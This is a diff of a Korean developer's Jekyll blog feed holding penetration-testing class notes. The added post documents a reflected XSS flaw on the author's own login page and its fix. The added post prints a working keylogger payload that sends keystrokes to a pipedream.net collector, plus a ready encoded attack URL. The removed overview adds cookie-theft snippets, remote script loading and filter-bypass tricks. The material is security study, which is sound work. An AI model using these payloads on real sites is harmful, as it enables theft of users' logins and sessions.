@@ -1,4 +1,99 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-05-30T15:41:40+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">기록하는 개발자</title><subtitle>기록소</subtitle><author><name>Jung MinGyu</name></author><entry><title type="html">그래프 그리기 위한것</title><link href="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/" rel="alternate" type="text/html" title="그래프 그리기 위한것" /><published>2099-09-09T00:00:00+09:00</published><updated>2099-12-31T23:13:00+09:00</updated><id>http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC</id><content type="html" xml:base="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/"><![CDATA[<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7qs7XqsqnsnpAgLT4-IOyEnOuyhCA6IOu5hOygleyDgSDtjpjsnbTsp4Ag7YyM652866-47YSw66W8IOuEo-ydgCDsiJjrn4kg7JqU7LKtXG7shJzrsoQgLT4-IOuCtOu2gCDshJzrsoQgOiDrgrTrtoAg7Y6Y7J207KeAIOyalOyyrVxu64K067aAIOyEnOuyhCAtPj4g7ISc67KEIDog64K067aAIO2OmOydtOyngCDsnZHri7VcbuyEnOuyhCAtPj4g6rO16rKp7J6QIDog64K067aAIO2OmOydtOyngCDsnZHri7UiLCJtZXJtYWlkIjpudWxsfQ" /></p>]]></content><author><name>Jung MinGyu</name></author><category term="모의해킹수업" /><category term="웹 구조" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">XSS 실습 7번</title><link href="http://localhost:4000/XSS7%EB%B2%88%EB%AC%B8%EC%A0%9C/" rel="alternate" type="text/html" title="XSS 실습 7번" /><published>2023-05-29T00:00:00+09:00</published><updated>2023-05-29T23:13:00+09:00</updated><id>http://localhost:4000/XSS7%EB%B2%88%EB%AC%B8%EC%A0%9C</id><content type="html" xml:base="http://localhost:4000/XSS7%EB%B2%88%EB%AC%B8%EC%A0%9C/"><![CDATA[<h2 id="xss-란">XSS 란?</h2>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-05-30T22:04:46+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">기록하는 개발자</title><subtitle>기록소</subtitle><author><name>Jung MinGyu</name></author><entry><title type="html">그래프 그리기 위한것</title><link href="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/" rel="alternate" type="text/html" title="그래프 그리기 위한것" /><published>2099-09-09T00:00:00+09:00</published><updated>2099-12-31T23:13:00+09:00</updated><id>http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC</id><content type="html" xml:base="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/"><![CDATA[<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7qs7XqsqnsnpAgLT4-IOyEnOuyhCA6IOu5hOygleyDgSDtjpjsnbTsp4Ag7YyM652866-47YSw66W8IOuEo-ydgCDsiJjrn4kg7JqU7LKtXG7shJzrsoQgLT4-IOuCtOu2gCDshJzrsoQgOiDrgrTrtoAg7Y6Y7J207KeAIOyalOyyrVxu64K067aAIOyEnOuyhCAtPj4g7ISc67KEIDog64K067aAIO2OmOydtOyngCDsnZHri7VcbuyEnOuyhCAtPj4g6rO16rKp7J6QIDog64K067aAIO2OmOydtOyngCDsnZHri7UiLCJtZXJtYWlkIjpudWxsfQ" /></p>]]></content><author><name>Jung MinGyu</name></author><category term="모의해킹수업" /><category term="웹 구조" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">로그인 페이지 Reflected XSS 취약점</title><link href="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84XSS%EC%B7%A8%EC%95%BD%EC%A0%90/" rel="alternate" type="text/html" title="로그인 페이지 Reflected XSS 취약점" /><published>2023-05-30T00:00:00+09:00</published><updated>2023-05-30T23:13:00+09:00</updated><id>http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84XSS%EC%B7%A8%EC%95%BD%EC%A0%90</id><content type="html" xml:base="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84XSS%EC%B7%A8%EC%95%BD%EC%A0%90/"><![CDATA[<h2 id="취약점-발견-위치">취약점 발견 위치</h2>
+<ul>
+  <li>직접 만든 사이트의 로그인 페이지에서 XSS 취약점을 발견하였다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/af4d52b7-22d7-44fe-a78d-406421828678" alt="Pasted image 20230530184238" /></li>
+</ul>
+
+<h2 id="취약점-유형">취약점 유형</h2>
+<ul>
+  <li>Reflected XSS 취약점.</li>
+  <li>POC 코드를 이용하여 alert 창이 출력되는 것을 확인하였다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/37c0fac8-7939-4a21-9069-94fcea7021e3" alt="Pasted image 20230530184503" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/82cea7f2-fa52-4ed0-a276-32627e9558ee" alt="Pasted image 20230530184521" /></li>
+</ul>
+
+<h2 id="공격-시나리오">공격 시나리오</h2>
+<ol>
+  <li>공격자가 키로거를 삽입한 로그인 링크를 만들어 사용자가 클릭하도록 유도한다.</li>
+  <li>사용자가 공격자가 전달한 링크를 통해 로그인을 시도한다면 사용자의 입력 정보가 그대로 공격자 서버로 전송된다.</li>
+  <li>공격자 서버에서 사용자가 입력한 정보를 그대로 확인할 수 있다.</li>
+</ol>
+
+<h2 id="공격-스크립트-작성">공격 스크립트 작성</h2>
+
+<ul>
+  <li>키로거 공격 스크립트</li>
+</ul>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
+<span class="kd">var</span> <span class="nx">keys</span> <span class="o">=</span> <span class="dl">""</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">hackURL</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">공격자 서버 주소?v=</span><span class="dl">"</span><span class="p">;</span>
+<span class="nb">window</span><span class="p">.</span><span class="nx">onkeydown</span><span class="o">=</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span>
+	<span class="nx">key</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">keyCode</span><span class="p">?</span><span class="nx">e</span><span class="p">.</span><span class="nx">keyCode</span><span class="p">:</span><span class="nx">e</span><span class="p">.</span><span class="nx">charCode</span><span class="p">;</span>
+	<span class="nx">key</span> <span class="o">=</span> <span class="nb">String</span><span class="p">.</span><span class="nf">fromCharCode</span><span class="p">(</span><span class="nx">key</span><span class="p">);</span>
+	<span class="nx">keys</span> <span class="o">+=</span> <span class="nx">key</span><span class="p">;</span>
+	<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span>
+<span class="p">};</span>
+<span class="nb">window</span><span class="p">.</span><span class="nf">setInterval</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span> 
+	<span class="nf">if</span><span class="p">(</span><span class="nx">keys</span> <span class="o">!=</span> <span class="dl">''</span><span class="p">)</span> <span class="p">{</span> 
+		<span class="k">new</span> <span class="nc">Image</span><span class="p">().</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">hackURL</span><span class="o">+</span><span class="nx">keys</span><span class="p">;</span>
+		<span class="nx">keys</span><span class="o">=</span><span class="dl">''</span><span class="p">;</span>
+	<span class="p">}</span> 
+<span class="p">},</span> <span class="mi">1000</span><span class="p">);</span>
+<span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<ul>
+  <li>완성 공격 URL 인코딩 전</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;var keys = "";var hackURL = "https://enpo6qk2njjal.x.pipedream.net/?v=";window.onkeydown=(e)=&gt;{key=e.keyCode?e.keyCode:e.charCode;key=String.fromCharCode(key);keys +=key;console.log(e);};window.setInterval(function(){if(keys !=''){new Image().src = hackURL+keys;keys='';}},1000);&lt;/script&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>URL 인코딩 후</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://221.27.0.6/sign_in_page?msg=%3cscript%3evar+keys+%3d+%22%22%3bvar+hackURL+%3d+%22https%3a%2f%2fenpo6qk2njjal.x.pipedream.net%2f%3fv%3d%22%3bwindow.onkeydown%3d(e)%3d%3e%7bkey%3de.keyCode%3fe.keyCode%3ae.charCode%3bkey%3dString.fromCharCode(key)%3bkeys+%2b%3dkey%3bconsole.log(e)%3b%7d%3bwindow.setInterval(function()%7bif(keys+!%3d%27%27)%7bnew+Image().src+%3d+hackURL%2bkeys%3bkeys%3d%27%27%3b%7d%7d%2c1000)%3b%3c%2fscript%3e
+</code></pre></div></div>
+
+<h2 id="공격-결과">공격 결과</h2>
+
+<ul>
+  <li>키로거 스크립트가 동작중인 로그인 페이지<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/e0e3b52a-12a8-4688-ac6f-fb18cbc0f9f2" alt="Pasted image 20230530205933" /></li>
+  <li>공격자 서버<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/964346f5-ebf9-4cf4-a239-c54fa1c06268" alt="Pasted image 20230530210038" /></li>
+  <li>사용자의 입력이 공격자의 서버로 잘 전송이된 것을 확인할 수 있다.</li>
+</ul>
+
+<h2 id="대응-방안">대응 방안</h2>
+<ul>
+  <li>로그인 페이징에서 찾은 Reflected XSS 취약점을 예방하기 위해서는 HTML 특수문자들을 HTML Entity 로 모두 치환해주면 된다.</li>
+  <li>사용자의 입력을 그대로 페이지에 보여주는 것이아닌 HTML Entity로 치환하여 보여준다.</li>
+</ul>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">var</span> <span class="n">msg</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"msg"</span><span class="o">);</span>
+<span class="c1">// msg html 태그를 html entity로 치환하기.</span>
+<span class="n">msg</span> <span class="o">=</span> <span class="n">filter</span><span class="o">(</span><span class="n">msg</span><span class="o">);</span>
+</code></pre></div></div>
+
+<ul>
+  <li>치환함수</li>
+</ul>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// xss 방지</span>
+<span class="kd">private</span> <span class="nc">String</span> <span class="nf">filter</span><span class="o">(</span><span class="nc">String</span> <span class="n">in</span><span class="o">){</span>
+	<span class="kt">var</span> <span class="n">re</span> <span class="o">=</span> <span class="n">in</span><span class="o">.</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">"[&amp;]"</span><span class="o">,</span> <span class="s">"&amp;amp;"</span><span class="o">)</span>
+			<span class="o">.</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">"[&lt;]"</span><span class="o">,</span> <span class="s">"&amp;lt;"</span><span class="o">)</span>
+			<span class="o">.</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">"[&gt;]"</span><span class="o">,</span> <span class="s">"&amp;gt;"</span><span class="o">)</span>
+			<span class="o">.</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">"[']"</span><span class="o">,</span> <span class="s">"&amp;#x27;"</span><span class="o">)</span>
+			<span class="o">.</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">"[\"]"</span><span class="o">,</span> <span class="s">"&amp;quot;"</span><span class="o">)</span>
+			<span class="o">.</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">"[(]"</span><span class="o">,</span> <span class="s">"&amp;#40;"</span><span class="o">)</span>
+			<span class="o">.</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">"[)]"</span><span class="o">,</span> <span class="s">"&amp;#41;"</span><span class="o">)</span>
+			<span class="o">.</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">"[/]"</span><span class="o">,</span> <span class="s">"&amp;#x2F;"</span><span class="o">);</span>
+	<span class="k">return</span> <span class="n">re</span><span class="o">;</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<ul>
+  <li>요청을 문자 그대로 인식하여 XSS를 예방한다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/60d0a792-8519-4680-ae8a-ebcc4fe1fe6b" alt="Pasted image 20230530212323" /></li>
+</ul>]]></content><author><name>Jung MinGyu</name></author><category term="XSS" /><category term="Reflected XSS" /><category term="java" /><summary type="html"><![CDATA[로그인 페이지 Reflected XSS 취약점 발견하였다.]]></summary></entry><entry><title type="html">XSS 실습 7번</title><link href="http://localhost:4000/XSS7%EB%B2%88%EB%AC%B8%EC%A0%9C/" rel="alternate" type="text/html" title="XSS 실습 7번" /><published>2023-05-29T00:00:00+09:00</published><updated>2023-05-29T23:13:00+09:00</updated><id>http://localhost:4000/XSS7%EB%B2%88%EB%AC%B8%EC%A0%9C</id><content type="html" xml:base="http://localhost:4000/XSS7%EB%B2%88%EB%AC%B8%EC%A0%9C/"><![CDATA[<h2 id="xss-란">XSS 란?</h2>
 <ul>
   <li>크라이언트 측 스크립트를 삽입하는 공격이다.</li>
 </ul>
@@ -1709,279 +1804,4 @@ document.forms[0].submit();
 <h3 id="xss">XSS</h3>
 <ul>
   <li>클라이언트 측 스크립트를 삽입하는 공격이다.</li>
-</ul>]]></content><author><name>Jung MinGyu</name></author><category term="XSS" /><category term="CSRF" /><category term="웹 해킹" /><summary type="html"><![CDATA[CSRF 란 무엇일까.]]></summary></entry><entry><title type="html">XSS 총 정리</title><link href="http://localhost:4000/XSS%EC%A0%95%EB%A6%AC/" rel="alternate" type="text/html" title="XSS 총 정리" /><published>2023-05-20T00:00:00+09:00</published><updated>2023-05-20T23:13:00+09:00</updated><id>http://localhost:4000/XSS%EC%A0%95%EB%A6%AC</id><content type="html" xml:base="http://localhost:4000/XSS%EC%A0%95%EB%A6%AC/"><![CDATA[<h2 id="xss--cross-site-scripting--란">XSS ( Cross-Site Scripting ) 란</h2>
-<ul>
-  <li>클라이언트 측 스크립트를 삽입하는 공격이다.</li>
-  <li>웹 애플리케이션에서 발생하는 취약점이다.</li>
-  <li>클라이언트 만이 피해를 입는다. 즉 서버에는 아무런 악영향을 안 끼친다.</li>
-  <li>클라이언트의 브라우저에서 개발자가 의도하지 않았던 스크립트가 실행된다.</li>
-  <li>취약한 웹 애플리케이션을 이용하는 사용자가 주 타겟이 된다.</li>
-  <li>사용자 쿠키를 탈취하는 세션 하이재킹( session hijacking ) 공격을 수행할 수 있다.</li>
-</ul>
-
-<h2 id="클라이언트-측-코드">클라이언트 측 코드</h2>
-<ul>
-  <li>html</li>
-  <li>javascript</li>
-  <li>css</li>
-</ul>
-
-<h2 id="poc-코드">POC 코드</h2>
-<ul>
-  <li>웹 애플리케이션 XSS 취약점을 이용한 공격이 가능함을 확인할 수 있다.</li>
-</ul>
-
-<h3 id="자주-이용하는-poc-코드">자주 이용하는 POC 코드</h3>
-<ul>
-  <li><code class="language-plaintext highlighter-rouge">alert(1)</code></li>
-  <li><code class="language-plaintext highlighter-rouge">console.log(1)</code></li>
-</ul>
-
-<h2 id="공격-피해">공격 피해</h2>
-
-<h3 id="사용자-쿠키-탈취">사용자 쿠키 탈취</h3>
-<ul>
-  <li>document.cookie 를 활용하여 사용자 쿠키 값을 훔친다.</li>
-  <li>사용자 브라우저의 쿠키에 저장된 합법적인 <strong>Session ID 값</strong>이나 <strong>액세스 토큰 값</strong>을 훔쳐 원격지 서버로 전송한다.</li>
-</ul>
-
-<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">hackUrl</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">원격지 서버?value=</span><span class="dl">"</span><span class="p">;</span>
-<span class="k">new</span> <span class="nc">Image</span><span class="p">().</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">hackURL</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span>
-</code></pre></div></div>
-
-<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">x</span> <span class="na">onerror=</span><span class="s">'var hackUrl = "원격지 서버?value=";new Image().src = hackURL + document.cookie;'</span><span class="nt">&gt;</span>
-</code></pre></div></div>
-
-<h3 id="사용자-개인정보-탈취">사용자 개인정보 탈취</h3>
-<ul>
-  <li>Key Logger 방식으로 사용자 입력을 탈취한다.</li>
-  <li>XSS Keylog 가 삽입된 페이지에 사용자가 접근하면 Keyboard Event 를 통해 입력 값을 후킹한다.</li>
-  <li>후킹한 값을 원격지 서버로 전송한다.</li>
-</ul>
-
-<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">keys</span> <span class="o">=</span> <span class="dl">""</span><span class="p">;</span>
-<span class="kd">var</span> <span class="nx">hackUrl</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">원격지 서버?value=</span><span class="dl">"</span><span class="p">;</span>
-<span class="nb">document</span><span class="p">.</span><span class="nx">onkeypress</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span> 
-	<span class="kd">get</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">event</span><span class="p">?</span><span class="nx">event</span><span class="p">:</span><span class="nx">e</span><span class="p">;</span>
-	<span class="nx">key</span> <span class="o">=</span> <span class="kd">get</span><span class="p">.</span><span class="nx">keyCode</span><span class="p">?</span><span class="kd">get</span><span class="p">.</span><span class="nx">keyCode</span><span class="p">:</span><span class="kd">get</span><span class="p">.</span><span class="nx">charCode</span><span class="p">;</span> 
-	<span class="nx">key</span> <span class="o">=</span> <span class="nb">String</span><span class="p">.</span><span class="nf">fromCharCode</span><span class="p">(</span><span class="nx">key</span><span class="p">);</span> 
-	<span class="nx">keys</span><span class="o">+=</span><span class="nx">key</span><span class="p">;</span> 
-<span class="p">}</span> 
-<span class="nb">window</span><span class="p">.</span><span class="nf">setInterval</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span> 
-	<span class="nf">if</span><span class="p">(</span><span class="nx">keys</span> <span class="o">!=</span> <span class="dl">''</span><span class="p">)</span> <span class="p">{</span> 
-		<span class="k">new</span> <span class="nc">Image</span><span class="p">().</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">hackUrl</span> <span class="o">+</span> <span class="nx">keys</span><span class="p">;</span>
-		<span class="nx">keys</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span> 
-	<span class="p">}</span> 
-<span class="p">},</span> <span class="mi">200</span><span class="p">);</span>
-</code></pre></div></div>
-
-<h3 id="악성코드-다운로드">악성코드 다운로드</h3>
-<ul>
-  <li>사용자가 악성 스크립트가 있는 URL을 클릭하도록 유도하여 악성 프로그램 다운로드 받는 사이트로 리타이렉한다.</li>
-  <li>사용자가 악성 프로그램을 다운로드 하도록 유도한다.</li>
-</ul>
-
-<h3 id="피싱-사이트-강제-이동">피싱 사이트 강제 이동</h3>
-<ul>
-  <li>가짜 사이트로 위장하여 사용자의 로그인 정보를 탈취한다.</li>
-  <li>실제 사이트와 유사한 웹 페이지를 통해 사용자의 개인정보를 훔쳐올 수 있다.</li>
-</ul>
-
-<h2 id="공격-유형">공격 유형</h2>
-
-<h3 id="stored--또는-persistent--xss">Stored ( 또는 Persistent ) XSS</h3>
-<ul>
-  <li>공격자가 악성 스크립트를 취약한 웹 서버에 저장하는 공격이다.</li>
-  <li>광역적으로 공격이 가능하다. 하지만 흔적이 웹 서버에 남는다.</li>
-  <li>지속적으로 피해를 입히는 공격이다.</li>
-  <li>공격자가 악성 스크립트를 웹 서버 페이지에 저장하고 해당 페이지가 사용자에게 노출시켜 악성 스크립트가 사용자 브라우저에서 자동으로 실행되게 된다.</li>
-</ul>
-
-<h4 id="취약점-유형">취약점 유형</h4>
-<ul>
-  <li>댓글</li>
-  <li>게시판</li>
-  <li>이메일</li>
-  <li>블로그 글</li>
-  <li>채팅방의 유저 이름</li>
-</ul>
-
-<h4 id="공격-과정">공격 과정</h4>
-<ol>
-  <li>공격자가 Stored XSS 취약점을 가지는 웹 페이지( 게시판 )를 찾는다.</li>
-  <li>공격자가 게시판에 사용자의 민감한 정보( 쿠키 )를 탈취하기 위한 악성 스크립트 코드를 포함한  글을 작성하고 저장한다.</li>
-  <li>공격자가 작성한 글에 사용자가 들어가면 민감한 정보(쿠키)를 공격자에게 전송한다.</li>
-</ol>
-
-<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7qs7XqsqnsnpAgLT4-IOqzteqyqeyekCA6IOy3qOyVve2VnCDsm7kg7Y6Y7J207KeAIOywvuq4sFxu6rO16rKp7J6QIC0-PiDqs7XqsqnsnpAgOiDqsozsi5zquIAg7J6R7ISxXG7qs7XqsqnsnpAgLT4-IOybuSDshJzrsoQgOiDqsozsi5zquIAg7KCA7J6lXG7sgqzsmqnsnpAgLT4-IOybuSDshJzrsoQgOiDqsozsi5zquIAg66qp66GdIOyalOyyrVxu7Ju5IOyEnOuyhCAtPj4g7IKs7Jqp7J6QIDog6rKM7Iuc6riAIOuqqeuhnSDsnZHri7VcbuyCrOyaqeyekCAtPj4g7IKs7Jqp7J6QIDog6rO16rKp7J6QIOqyjOyLnOq4gCDtgbTrpq1cbuyCrOyaqeyekCAtPj4g6rO16rKp7J6QIDog66-86rCQ7ZWcIOygleuztCDsoITri6wiLCJtZXJtYWlkIjpudWxsfQ" /></p>
-
-<h3 id="reflected-xss">Reflected XSS</h3>
-<ul>
-  <li>Get 방식을 통해 공격이 이루어 진다.</li>
-  <li>사용자 입력을 그대로 페이지에 보여주는 곳에서 발생한다.</li>
-  <li>공격자는 URL에 악성 스크립트를 심고, 만들어진 URL을 사용자에게 전달한다. 이러면 사용자 브라우저에서 악성 스크립트가 실행된다.</li>
-  <li>SSR ( Server Side Rendering ). 서버에서 페이지를 완성하여 사용자에게 보내주는 페이지에서 발생하는 취약점이다.</li>
-</ul>
-
-<h4 id="취약점-유형-1">취약점 유형</h4>
-<ul>
-  <li>사용자 입력을 그대로 페이지에 보여주는 사이트.</li>
-  <li>사용자 입력이 웹 페이지 코드에 그대로 들어가는 사이트.</li>
-</ul>
-
-<h4 id="과정">과정</h4>
-<ol>
-  <li>공격자가 Reflected XSS 취약점이 있는 페이지를 찾는다.</li>
-  <li>공격자는 XSS 취약점 페이지의 URL의 파라미터에 악성 스크립트 코드를 사입하여 공격 URL을 만든다.</li>
-  <li>공격자가 만든 URL을 사용자에게 건내주어 클릭하도록 유도한다.</li>
-  <li>사용자가 링크를 클릭하여 페이지 들어 가면 사용자 브라우저에서 악성 스크립트가 실행된다.</li>
-</ol>
-
-<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7qs7XqsqnsnpAgLT4-IOqzteqyqeyekCA6IFJlZmxlY3RlZCBYU1Mg7Leo7JW97KCQIO2OmOydtOyngCDssL7quLBcbuqzteqyqeyekCAtPj4g6rO16rKp7J6QIDog7JWF7ISxIOyKpO2BrOumve2KuOulvCDri7TsnYAgVVJMIOunjOuTrFxu6rO16rKp7J6QIC0-PiDsgqzsmqnsnpAgOiBVUkwg66eB7YGs66W8IO2BtOumre2VmOuPhOuhnSDsnKDrj4RcbuyCrOyaqeyekCAtPj4g7IKs7Jqp7J6QIDogVVJMIO2BtOumrVxu7IKs7Jqp7J6QIC0-PiDsm7kg7ISc67KEIDog7Y6Y7J207KeAIOyalOyyrVxu7Ju5IOyEnOuyhCAtPj4g7IKs7Jqp7J6QIDog7JmE7ISx65CcIO2OmOydtOyngCDsnZHri7VcbuyCrOyaqeyekCAtPj4g7IKs7Jqp7J6QIDog7JWF7ISxIOyKpO2BrOumvSDsi6TtlolcbuyCrOyaqeyekCAtPj4g6rO16rKp7J6QIDog66-86rCQ7ZWcIOygleuztCDsoITri6wiLCJtZXJtYWlkIjpudWxsfQ" /></p>
-
-<h3 id="dom-based-xss">DOM Based XSS</h3>
-<ul>
-  <li>서버 측에서 탐지하기가 어렵다.</li>
-  <li>최초에 HTML 문서를 서버로 부터 받으면, 그 이후에는 서버로 요청을 보내지 않고 악성스크립트를 심을 수 있다.</li>
-  <li>서버에 요청은 없지만,  URL 주소 해시에 심은 악성 스크립트가 실행된다.</li>
-  <li>CSR(Client Side Rendering) 클라이언트 사이드에서 페이지를 그려준다. 즉 클라이언트 브라우저의 javascript 에서 get 요청 값을 가져와 페이지를 완성시킨다.</li>
-</ul>
-
-<h4 id="취약점-유형-2">취약점 유형</h4>
-<ul>
-  <li>사용자 입력을 그대로 페이지에 보여주는 사이트.</li>
-</ul>
-
-<h4 id="과정-1">과정</h4>
-<ol>
-  <li>공격자는 DOM Based XSS 취약점이 있는 페이지를 찾는다.</li>
-  <li>공격자는 XSS 취약점이 있는 페이지 URL의 파라미터에 악성 스크립트를 넣어준다.</li>
-  <li>공격자는 완성한 URL을 사용자에게 보내어 클릭하도록 유도한다.</li>
-  <li>사용자가 URL 링크를 클릭하여 페이지에 들어가면 사용자 브라우저에서 악성 스크립트가 동작한다.</li>
-</ol>
-
-<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7qs7XqsqnsnpAgLT4-IOqzteqyqeyekCA6IERPTSBCYXNlZCBYU1Mg7Leo7JW97KCQIO2OmOydtOyngCDssL7quLAuXG7qs7XqsqnsnpAgLT4-IOqzteqyqeyekCA6IOyVheyEsSDsiqTtgazrpr3tirjrpbwg64u07J2AIFVSTCDrp4zrk6wuXG7qs7XqsqnsnpAgLT4-IOyCrOyaqeyekCA6IFVSTOydhCDrs7TrgrTslrQg7YG066at7ZWY64-E66GdIOycoOuPhO2VnOuLpC5cbuyCrOyaqeyekCAtPj4g7IKs7Jqp7J6QIDogVVJMIO2BtOumrVxu7IKs7Jqp7J6QIC0-PiDsm7kg7ISc67KEIDog7Y6Y7J207KeAIOyalOyyrVxu7Ju5IOyEnOuyhCAtPj4g7IKs7Jqp7J6QIDog66-47JmE7ISxIO2OmOydtOyngCDsnZHri7VcbuyCrOyaqeyekCAtPj4g7IKs7Jqp7J6QIDog7Y6Y7J207KeAIOuPmeyggeycvOuhnCDsmYTshLFcbuyCrOyaqeyekCAtPj4g7IKs7Jqp7J6QIDog7JWF7ISxIOyKpO2BrOumve2KuCDsi6TtlolcbuyCrOyaqeyekCAtPj4g6rO16rKp7J6QIDog66-86rCQ7ZWcIOygleuztCDsoITri6wiLCJtZXJtYWlkIjpudWxsfQ" /></p>
-
-<h2 id="xss-bypass--우회방법-">XSS Bypass ( 우회방법 )</h2>
-<ul>
-  <li>서버에서 Black List 기반의 XSS 필터링을 적용 되었을 때의 우회방법이다.</li>
-</ul>
-
-<h3 id="client-side-검증-우회">Client Side 검증 우회</h3>
-<ul>
-  <li>Burp Suite (프록시 툴)을 이용하여 다시 원래대로 만들어 준다.</li>
-</ul>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>client side에서 치환된다.
-&lt;script&gt; =&gt; &amp;lt;script&amp;gt;
-
-프록시 툴로 다시 원래대로 만든다.
-&amp;lt;script&amp;gt; =&gt; &lt;script&gt;
-</code></pre></div></div>
-
-<h3 id="script-load">Script Load</h3>
-<ul>
-  <li>XSS 공격할 때 글자 수가 제한되어 있다면 유용하다.</li>
-</ul>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script src="http://악성스크립트"&gt;&lt;/script&gt;
-</code></pre></div></div>
-
-<h3 id="대소문자-혼용하기">대소문자 혼용하기</h3>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt; =&gt; &lt;ScRiPt&gt;
-</code></pre></div></div>
-
-<h3 id="필터링-되는-문자">필터링 되는 문자</h3>
-<ul>
-  <li>만약 서버에서 script 라는 문자를 빈칸으로 바꾼다면 다음과 같이 우회하면 된다.</li>
-</ul>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt; =&gt; &lt;scrscriptipt&gt;
-</code></pre></div></div>
-
-<h3 id="eventhandler">EventHandler</h3>
-<ul>
-  <li>많은 태그와 이벤트 헨들러로 우회를 시도할 수 있다.</li>
